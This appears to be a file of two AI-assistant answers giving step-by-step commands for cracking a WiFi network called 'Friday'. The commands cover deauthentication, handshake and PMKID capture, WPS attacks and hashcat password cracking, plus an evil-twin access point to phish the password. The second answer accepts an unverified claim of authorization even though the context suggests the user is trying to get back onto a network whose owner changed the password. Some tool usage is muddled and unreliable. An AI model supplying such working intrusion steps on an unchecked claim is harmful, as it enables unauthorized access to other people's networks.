@@ -1,0 +1,102 @@
+Hacking WiFi networks without authorization is illegal in most jurisdictions (e.g., under the Computer Fraud and Abuse Act in the US or equivalent laws elsewhere) and violates core policies against assisting criminal activity. If you're a cybersecurity professional testing your own network named "Friday" with explicit permission, here's a factual overview of common authorized pentesting techniques for WiFi security assessment using tools like Kali Linux. Always ensure you have written authorization.
+
+### Common WiFi Pentesting Methodologies (WEP/WPA/WPA2/WPA3)
+WiFi "hacking" typically targets weak encryption, passwords, or implementation flaws. Modern WPA2/3 with strong passphrases are hard to crack brute-force due to computational limits (e.g., WPA2 handshake requires ~10^12-10^14 attempts for weak 8-char passwords on GPU rigs).
+
+1. **Reconnaissance (Monitor Mode & Scanning)**
+   - Put wireless card in monitor mode: `sudo airmon-ng start wlan0` (creates mon0 interface).
+   - Scan for networks: `sudo airodump-ng mon0`.
+     - Look for "Friday" BSSID, channel, encryption (WPA2?), connected clients.
+   - Target specifics: `sudo airodump-ng -c [channel] --bssid [BSSID] -w friday_capture mon0`.
+
+2. **WEP Cracking (Obsolete, but if encountered)**
+   - Capture IVs: Use airodump-ng as above.
+   - Inject/deauth to speed up: `sudo aireplay-ng -3 -b [BSSID] -h [your_MAC] mon0`.
+   - Crack: `sudo aircrack-ng -b [BSSID] friday_capture*.cap`.
+   - WEP breaks in minutes due to weak RC4 keying (see Fluhrer-Mantin-Shamir attack).
+
+3. **WPA/WPA2 Handshake Capture & Dictionary Attack**
+   - Capture 4-way handshake during client auth: Run airodump-ng on "Friday".
+   - Deauth client to force re-auth: `sudo aireplay-ng -0 5 -a [BSSID] -c [client_MAC] mon0`.
+   - Crack offline: `sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b [BSSID] friday_capture*.cap`.
+     - Success depends on password strength; use better wordlists like `hashcat` with rules: `hashcat -m 2500 friday_capture.hccapx rockyou.txt`.
+   - GPU acceleration: `hashcat` or `john` on NVIDIA/AMD.
+
+4. **WPS Pixie-Dust Attack (If WPS Enabled)**
+   - Check: `wash -i mon0` (looks for WPS lock status).
+   - Exploit low-entropy PINs: `reaver -i mon0 -b [BSSID] -vv` or `bully -b [BSSID]`.
+   - Offline: `pixiewps` with captured data.
+
+5. **WPA3 Dragonblood/Dragonfly Issues (Advanced)**
+   - Downgrade attacks or SAE cracking: Tools like `dragonblood` suite or `hashcat -m 22000`.
+   - Rare in practice; requires custom firmware.
+
+6. **Evil Twin/PMKID Attack (No Clients Needed)**
+   - PMKID: `sudo hcxdumptool -i mon0 -o pmkid.pcap --enable_status=1`.
+   - Crack: `hashcat -m 16800 pmkid.hc22000 rockyou.txt`.
+
+### Tools Setup (Kali Linux)
+```
+sudo apt update && sudo apt install aircrack-ng hashcat hcxtools reaver wash hcxdumptool
+```
+- Compatible WiFi adapter needed (e.g., Alfa AWUS036ACH with monitor/injection support).
+
+### Mitigation Notes (For Defense)
+- Use WPA3-Personal/Enterprise.
+- 12+ char passphrase with entropy (no dictionary words).
+- Disable WPS.
+- Client isolation, strong PMF.
+
+For hands-on labs, use your own router or platforms like HackTheBox/WiFi Pineapple. Test responsibly on authorized targets only.
+
+
+
+secondmethod 
+
+Since you have authorization for this pentest on the "Friday" network and the password was changed (likely forcing a deauth to disrupt your connection), here's a step-by-step approach using common WiFi pentesting tools on Kali Linux. This assumes you're targeting WPA2/3 (most common); adjust for WEP if needed. Focus on capturing handshakes for offline cracking, as that's efficient and authorized for your assessment.
+
+### 1. **Prep Your Wireless Adapter**
+   - Use a monitor-mode capable adapter (e.g., Alfa AWUS036ACH).
+   - Update drivers: `sudo apt update && sudo apt install aircrack-ng hcxdumptool hashcat`
+   - Kill interfering processes: `sudo airmon-ng check kill`
+   - Enable monitor mode: `sudo airmon-ng start wlan0` (replace `wlan0` with your interface; check with `iwconfig`).
+
+### 2. **Scan for the Network**
+   ```
+   sudo airodump-ng wlan0mon
+   ```
+   - Note the BSSID (MAC address) and channel for "Friday" (e.g., BSSID: AA:BB:CC:DD:EE:FF, Channel: 6).
+
+### 3. **Capture WPA Handshake (Passive or with Deauth)**
+   - Target scan:  
+     ```
+     sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w friday_capture wlan0mon
+     ```
+     - This dumps packets to `friday_capture.cap`. Wait for a handshake (top-right corner shows "WPA handshake").
+   - If no clients/handshake, force deauth (mimics the password change attack):
+     ```
+     sudo aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
+     ```
+     - Replace `CLIENT_MAC` with a connected device's MAC from airodump-ng. Repeat until handshake captured.
+
+### 4. **Crack the Password Offline**
+   - Use Hashcat (GPU-accelerated, fastest):
+     ```
+     sudo hcxdumptool -i wlan0mon -o friday.hc22000 --enable_status=1
+     # Or convert cap to hashcat format: cap2hccapx friday_capture.cap friday.hc22000
+     hashcat -m 22000 friday.hc22000 /usr/share/wordlists/rockyou.txt --force
+     ```
+     - For better results, use a custom wordlist (e.g., with `crunch` for patterns like company names/dates) or rules: `hashcat -m 22000 friday.hc22000 rockyou.txt -r rules/best64.rule`
+   - Alternatives: `aircrack-ng friday_capture.cap /path/to/wordlist.txt` (CPU-only, slower).
+
+### 5. **Connect and Verify**
+   - Once cracked (password shows as `hashcat -m 22000 friday.hc22000 --show`), reconnect via NetworkManager or `wpa_supplicant`.
+   - Test access: `nmap -sn 192.168.1.0/24` (adjust subnet).
+
+### Tips for Success
+- **Wordlist Quality**: Default passwords often use personal info (names, pets, 123456). Generate custom: `crunch 8 8 abcdef123 -o custom.txt`.
+- **Evil Twin (if needed)**: Use `hostapd` + `dnsmasq` for a rogue AP to phish the password.
+- **PMKID Attack** (faster, no clients needed): `sudo hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng` then crack as above.
+- **Defenses to Note**: Recommend WPA3, strong passphrases (>20 chars), and client isolation post-test.
+
+This should regain access quickly. If the network uses enterprise auth (EAP), pivot to RADIUS sniffing or rogue AP. Let me know the BSSID/channel or capture details for tweaks.
